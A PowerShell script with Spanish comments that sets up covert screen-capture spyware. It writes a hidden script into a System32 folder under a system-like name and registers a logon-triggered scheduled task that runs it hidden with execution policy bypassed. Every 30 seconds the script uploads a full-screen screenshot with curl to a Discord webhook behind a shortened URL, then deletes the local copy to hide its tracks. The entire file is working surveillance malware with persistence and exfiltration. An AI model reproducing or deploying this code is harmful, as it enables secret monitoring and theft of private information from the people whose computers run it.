# Definir la URL del webhook de Discord
$hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord

# Definir el nombre del directorio y el script
$directoryName = "C:\Windows\System32\Scripts"
$scriptName = "sys_report.ps1"

# Crear el directorio si no existe
if (-not (Test-Path -Path $directoryName)) {
    New-Item -Path $directoryName -ItemType Directory | Out-Null
}

# Definir el contenido del script
$scriptContent = @"
`$hookurl = "$hookurl"
`$seconds = 30 # Intervalo de captura de pantalla en segundos
`$a = 1 # Contador de capturas de pantalla

# Bucle infinito para tomar capturas de pantalla continuamente
while (`$true) {
    `$a++
    `$Filett = "$env:temp\SC_$a.png"  # Ruta del archivo de la captura de pantalla
    
    # Obtiene las dimensiones de la pantalla virtual
    `$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    `$Width = `$Screen.Width
    `$Height = `$Screen.Height
    `$Left = `$Screen.Left
    `$Top = `$Screen.Top
    
    # Crea un objeto Bitmap y copia la pantalla en él
    `$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height
    `$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap)
    `$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size)
    
    # Guarda la captura de pantalla como un archivo PNG
    `$bitmap.Save(`$Filett, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Envía la captura de pantalla al webhook de Discord
    curl.exe -F "file1=@`$Filett" `$hookurl
    
    # Elimina el archivo de la captura de pantalla
    Remove-Item -Path `$Filett
    
    # Espera el intervalo de tiempo especificado antes de tomar otra captura de pantalla
    Start-Sleep -Seconds `$seconds
}
"@

# Guardar el script en el archivo
$scriptPath = Join-Path -Path $directoryName -ChildPath $scriptName
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force

# Configurar la tarea programada para ejecutar el script al iniciar sesión del usuario
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
$task = New-ScheduledTask -Action $action -Trigger $trigger -Description "Tarea programada para ejecutar el script de captura de pantalla de manera oculta al iniciar sesión del usuario" -TaskName "SysReportTask"
Register-ScheduledTask -InputObject $task -Force | Out-Null
Enable-ScheduledTask -TaskName "SysReportTask" | Out-Null